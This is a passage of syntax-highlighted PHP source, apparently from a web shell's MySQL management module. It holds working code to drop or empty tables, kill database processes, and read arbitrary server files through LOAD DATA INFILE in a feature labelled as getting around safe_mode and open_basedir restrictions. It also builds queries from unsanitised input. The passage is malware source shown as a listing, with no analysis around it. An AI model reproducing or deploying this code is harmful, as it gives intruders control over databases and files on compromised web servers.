<span class="lineno"> 918</span> <span class="x">            &lt;td&gt;&lt;input type=&quot;checkbox&quot; name=&quot;boxtbl[]&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;/td&gt;</span>
<span class="lineno"> 919</span> <span class="x">            &lt;td&gt;&lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">sql_tbl=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;b&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&lt;/b&gt;&lt;/a&gt;&lt;/td&gt;</span>
<span class="lineno"> 920</span> <span class="x">            &lt;td&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Rows&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&lt;/td&gt;&lt;td&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Engine&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&lt;/td&gt;&lt;td&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Create_time&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&lt;/td&gt;&lt;td&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Update_time&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&lt;/td&gt;&lt;td&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$size</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&lt;/td&gt;</span>
<span class="lineno"> 921</span> <span class="x">            &lt;td&gt;&lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">sql_act=query&amp;sql_query=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;Empty&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">sql_act=query&amp;sql_query=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DROP TABLE `&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;Drop&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">sql_tbl_act=insert&amp;sql_tbl=</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">];</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;Insert&lt;/a&gt;&lt;/td&gt;</span>
<span class="lineno"> 922</span> <span class="x">        &lt;/tr&gt;</span>
<span class="lineno"> 923</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 924</span>                <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 925</span>              <span class="p">}</span>
<span class="lineno"> 926</span>              <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno"> 927</span>                    <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&lt;th&gt;+&lt;/th&gt;&lt;th&gt;</span><span class="si">$i</span><span class="s2"> table(s)&lt;/th&gt;&lt;th&gt;</span><span class="si">$trows</span><span class="s2">&lt;/th&gt;&lt;th&gt;</span><span class="si">$row[1]</span><span class="s2">&lt;/th&gt;&lt;th&gt;</span><span class="si">$row[10]</span><span class="s2">&lt;/th&gt;&lt;th&gt;</span><span class="si">$row[11]</span><span class="s2">&lt;/th&gt;&lt;th&gt;&quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nv">$tsize</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/th&gt;&lt;th&gt;&lt;/th&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 928</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 929</span> 
<span class="lineno"> 930</span> 
<span class="lineno"> 931</span> <span class="x">        &lt;/tr&gt;</span>
<span class="lineno"> 932</span> <span class="x">    &lt;/table&gt;</span>
<span class="lineno"> 933</span> <span class="x">    &lt;div align=&quot;right&quot;&gt;</span>
<span class="lineno"> 934</span> <span class="x">    &lt;select name=&quot;sql_act&quot;&gt;</span>
<span class="lineno"> 935</span> <span class="x">        &lt;option value=&quot;&quot;&gt;With selected:&lt;/option&gt;</span>
<span class="lineno"> 936</span> <span class="x">        &lt;option value=&quot;tbldrop&quot;&gt;Drop&lt;/option&gt;</span>
<span class="lineno"> 937</span> <span class="x">        &lt;option value=&quot;tblempty&quot;&gt;Empty&lt;/option&gt;&quot;;</span>
<span class="lineno"> 938</span> <span class="x">        &lt;option value=&quot;tbldump&quot;&gt;Dump&lt;/option&gt;&quot;;</span>
<span class="lineno"> 939</span> <span class="x">        &lt;option value=&quot;tblcheck&quot;&gt;Check table&lt;/option&gt;&quot;;</span>
<span class="lineno"> 940</span> <span class="x">        &lt;option value=&quot;tbloptimize&quot;&gt;Optimize table&lt;/option&gt;&quot;;</span>
<span class="lineno"> 941</span> <span class="x">        &lt;option value=&quot;tblrepair&quot;&gt;Repair table&lt;/option&gt;&quot;;</span>
<span class="lineno"> 942</span> <span class="x">        &lt;option value=&quot;tblanalyze&quot;&gt;Analyze table&lt;/option&gt;&quot;;</span>
<span class="lineno"> 943</span> <span class="x">    &lt;/select&gt;</span>
<span class="lineno"> 944</span> <span class="x">    &lt;input type=&quot;submit&quot; value=&quot;Confirm&quot;&gt;</span>
<span class="lineno"> 945</span> <span class="x">    &lt;/div&gt;</span>
<span class="lineno"> 946</span> <span class="x">    &lt;/form&gt;</span>
<span class="lineno"> 947</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 948</span>              <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno"> 949</span>            <span class="p">}</span>
<span class="lineno"> 950</span>          <span class="p">}</span>
<span class="lineno"> 951</span>        <span class="p">}</span>
<span class="lineno"> 952</span>      <span class="p">}</span>
<span class="lineno"> 953</span>    <span class="p">}</span>
<span class="lineno"> 954</span>    <span class="k">else</span> <span class="p">{</span>
<span class="lineno"> 955</span>         <span class="nv">$acts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;newdb&quot;</span><span class="p">,</span><span class="s2">&quot;serverstatus&quot;</span><span class="p">,</span><span class="s2">&quot;servervars&quot;</span><span class="p">,</span><span class="s2">&quot;processes&quot;</span><span class="p">,</span><span class="s2">&quot;getfile&quot;</span><span class="p">);</span>
<span class="lineno"> 956</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$acts</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 957</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 958</span> 
<span class="lineno"> 959</span> 
<span class="lineno"> 960</span> <span class="x">    &lt;table&gt;</span>
<span class="lineno"> 961</span> <span class="x">        &lt;tr&gt;</span>
<span class="lineno"> 962</span> <span class="x">        &lt;td&gt;&lt;b&gt;Create new DB:&lt;/b&gt;</span>
<span class="lineno"> 963</span> <span class="x">        &lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 964</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&gt;</span>
<span class="lineno"> 965</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;newdb&quot;&gt;</span>
<span class="lineno"> 966</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 967</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 968</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 969</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 970</span> <span class="x">            &lt;input type=&quot;text&quot; name=&quot;sql_newdb&quot; size=&quot;20&quot;&gt;</span>
<span class="lineno"> 971</span> <span class="x">            &lt;input type=&quot;submit&quot; value=&quot;Create&quot;&gt;</span>
<span class="lineno"> 972</span> <span class="x">        &lt;/form&gt;</span>
<span class="lineno"> 973</span> <span class="x">        &lt;/td&gt;</span>
<span class="lineno"> 974</span> <span class="x">        &lt;td&gt;&lt;b&gt;View File:&lt;/b&gt;</span>
<span class="lineno"> 975</span> <span class="x">        &lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 976</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&gt;</span>
<span class="lineno"> 977</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;getfile&quot;&gt;</span>
<span class="lineno"> 978</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 979</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 980</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 981</span> <span class="x">            &lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 982</span> <span class="x">            &lt;input type=&quot;text&quot; name=&quot;sql_getfile&quot; size=&quot;30&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_getfile</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno"> 983</span> <span class="x">            &lt;input type=&quot;submit&quot; value=&quot;Get&quot;&gt;</span>
<span class="lineno"> 984</span> <span class="x">        &lt;/form&gt;</span>
<span class="lineno"> 985</span> <span class="x">        &lt;/td&gt;</span>
<span class="lineno"> 986</span> <span class="x">        &lt;/tr&gt;</span>
<span class="lineno"> 987</span> <span class="x">    &lt;/table&gt;</span>
<span class="lineno"> 988</span> <span class="cp">&lt;?php</span>
<span class="lineno"> 989</span>        <span class="p">}</span>
<span class="lineno"> 990</span>        <span class="c1">###[ SQL ACTIONS ]###</span>
<span class="lineno"> 991</span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 992</span>          <span class="k">echo</span> <span class="s2">&quot;&lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 993</span>          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;newdb&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 994</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 995</span>            <span class="k">if</span> <span class="p">((</span><span class="nb">mysql_create_db</span> <span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">))</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> has been created with success!&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 996</span>            <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t create DB </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_newdb</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">.&lt;br&gt;Reason:&lt;/b&gt; &quot;</span><span class="o">.</span><span class="nx">mysql_smarterror</span><span class="p">();}</span>
<span class="lineno"> 997</span>          <span class="p">}</span>
<span class="lineno"> 998</span>          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;serverstatus&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 999</span>            <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW STATUS&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno">1000</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;b&gt;Server-status variables:&lt;/b&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1001</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;table&gt;&lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1002</span>            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1003</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1004</span>            <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno">1005</span>          <span class="p">}</span>
<span class="lineno">1006</span>          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;servervars&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1007</span>            <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW VARIABLES&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno">1008</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;b&gt;Server variables:&lt;/b&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1009</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;table&gt;&lt;td&gt;&lt;b&gt;Name&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1010</span>            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1011</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1012</span>            <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno">1013</span>          <span class="p">}</span>
<span class="lineno">1014</span>          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;processes&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1015</span>            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$kill</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1016</span>              <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;KILL &quot;</span><span class="o">.</span><span class="nv">$kill</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span>
<span class="lineno">1017</span>              <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno">1018</span>              <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Process #&quot;</span><span class="o">.</span><span class="nv">$kill</span><span class="o">.</span><span class="s2">&quot; was killed.&lt;/b&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1019</span>            <span class="p">}</span>
<span class="lineno">1020</span>            <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW PROCESSLIST&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno">1021</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;center&gt;&lt;b&gt;Processes:&lt;/b&gt;&lt;br&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1022</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;table&gt;&lt;td&gt;&lt;b&gt;ID&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;USER&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;HOST&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;DB&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;COMMAND&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;TIME&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;STATE&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;INFO&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1023</span>            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_NUM</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;td&gt;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=processes&amp;kill=&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;u&gt;Kill&lt;/u&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1024</span>            <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1025</span>            <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno">1026</span>          <span class="p">}</span>
<span class="lineno">1027</span>          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;getfile&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1028</span>            <span class="nv">$tmpdb</span> <span class="o">=</span> <span class="nv">$sql_login</span><span class="o">.</span><span class="s2">&quot;_tmpdb&quot;</span><span class="p">;</span>
<span class="lineno">1029</span>            <span class="nv">$select</span> <span class="o">=</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span>
<span class="lineno">1030</span>            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$select</span><span class="p">)</span> <span class="p">{</span><span class="nb">mysql_create_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span> <span class="nv">$select</span> <span class="o">=</span> <span class="nb">mysql_select_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span> <span class="nv">$created</span> <span class="o">=</span> <span class="o">!!</span><span class="nv">$select</span><span class="p">;}</span>
<span class="lineno">1031</span>            <span class="k">if</span> <span class="p">(</span><span class="nv">$select</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1032</span>              <span class="nv">$created</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
<span class="lineno">1033</span>              <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );&quot;</span><span class="p">);</span>
<span class="lineno">1034</span>              <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;LOAD DATA INFILE </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$sql_getfile</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> INTO TABLE tmp_file&quot;</span><span class="p">);</span>
<span class="lineno">1035</span>              <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM tmp_file;&quot;</span><span class="p">);</span>
<span class="lineno">1036</span>              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Error in reading file (permision denied)!&lt;/b&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1037</span>              <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1038</span>                <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">mysql_num_fields</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_field_name</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="nv">$i</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1039</span>                <span class="nv">$f</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">1040</span>                <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$f</span> <span class="o">.=</span> <span class="nb">join</span> <span class="p">(</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$row</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1041</span>                <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;File </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_getfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> does not exists or empty!&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">;}</span>
